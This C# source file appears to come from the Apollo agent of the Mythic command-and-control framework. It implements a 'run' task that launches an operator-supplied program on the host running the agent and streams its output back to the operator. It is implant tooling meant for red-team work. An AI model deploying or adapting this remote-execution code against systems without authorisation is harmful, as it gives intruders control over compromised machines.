#define COMMAND_NAME_UPPER

#if DEBUG
#define RUN
#endif

#if RUN

using ApolloInterop.Classes;
using ApolloInterop.Classes.Api;
using ApolloInterop.Classes.Core;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.ApolloStructs;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Text;
using System.Threading;

namespace Tasks
{
    public class run : Tasking
    {
        [DataContract]
        internal struct RunParameters
        {
            [DataMember(Name = "executable")] public string Executable;
            [DataMember(Name = "arguments")] public string Arguments;
        }
        private delegate IntPtr CommandLineToArgvW(
            [MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine,
            out int pNumArgs);

        private delegate IntPtr LocalFree(IntPtr hMem);

        private LocalFree _pLocalFree;
        private CommandLineToArgvW _pCommandLineToArgvW;

        private AutoResetEvent _complete = new AutoResetEvent(false);
        public run(IAgent agent, Task task) : base(agent, task)
        {
            _pLocalFree = _agent.GetApi().GetLibraryFunction<LocalFree>(Library.KERNEL32, "LocalFree");
            _pCommandLineToArgvW = _agent.GetApi().GetLibraryFunction<CommandLineToArgvW>(Library.SHELL32, "CommandLineToArgvW");
        }

        public override void Start()
        {
            Process proc = null;
            if (string.IsNullOrEmpty(_data.Parameters))
            {
                _agent.GetTaskManager().AddTaskResponseToQueue(
                    CreateTaskResponse(
                        "No command line arguments passed.", true, "error"));
            }
            else
            {
                RunParameters parameters = _jsonSerializer.Deserialize<RunParameters>(_data.Parameters);
                string mythiccmd = parameters.Executable;
                if (!string.IsNullOrEmpty(parameters.Arguments))
                {
                    mythiccmd += " " + parameters.Arguments;
                }

                string[] parts = ParseCommandLine(mythiccmd);
                if (parts == null)
                {
                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                        $"Failed to parse command line: {Marshal.GetLastWin32Error()}",
                        true,
                        "error"));
                }
                else
                {
                    string app = parts[0];
                    string cmdline = null;
                    if (parts.Length > 1)
                    {
                        cmdline = mythiccmd.Replace(app, "").TrimStart();
                    }

                    proc = _agent.GetProcessManager().NewProcess(app, cmdline);
                    proc.OutputDataReceived += DataReceived;
                    proc.ErrorDataReceieved += DataReceived;
                    proc.Exit += Proc_Exit;
                    bool bRet = false;
                    bRet = proc.Start();
                    if (!bRet)
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                            $"Failed to start process. Reason: {System.Runtime.InteropServices.Marshal.GetLastWin32Error()}",
                            true,
                            "error"));
                    }
                    else
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                            "", false, "", new IMythicMessage[]
                            {
                                Artifact.ProcessCreate((int) proc.PID, app, cmdline)
                            }));
                        try
                        {
                            WaitHandle.WaitAny(new WaitHandle[]
                            {
                                _complete,
                                _cancellationToken.Token.WaitHandle
                            });
                        }
                        catch (OperationCanceledException)
                        {
                        }

                        if (proc != null && !proc.HasExited)
                        {
                            proc.Kill();
                        }
                    }
                }
            }
        }

        private void Proc_Exit(object sender, EventArgs e)
        {
            _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                "", true));
            _complete.Set();
        }

        private void DataReceived(object sender, ApolloInterop.Classes.Events.StringDataEventArgs e)
        {
            if (!string.IsNullOrEmpty(e.Data))
            {
                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                    e.Data,
                    false,
                    ""));
            }
        }

        private string[] ParseCommandLine(string cmdline)
        {
            int numberOfArgs;
            IntPtr ptrToSplitArgs;
            string[] splitArgs;

            ptrToSplitArgs = _pCommandLineToArgvW(cmdline, out numberOfArgs);

            // CommandLineToArgvW returns NULL upon failure.
            if (ptrToSplitArgs == IntPtr.Zero)
                return null;

            // Make sure the memory ptrToSplitArgs to is freed, even upon failure.
            try
            {
                splitArgs = new string[numberOfArgs];

                // ptrToSplitArgs is an array of pointers to null terminated Unicode strings.
                // Copy each of these strings into our split argument array.
                for (int i = 0; i < numberOfArgs; i++)
                    splitArgs[i] = Marshal.PtrToStringUni(
                        Marshal.ReadIntPtr(ptrToSplitArgs, i * IntPtr.Size));

                return splitArgs;
            }
            catch
            {
                return null;
            }
            finally
            {
                // Free memory obtained by CommandLineToArgW.
                _pLocalFree(ptrToSplitArgs);
            }
        }
    }
}
#endif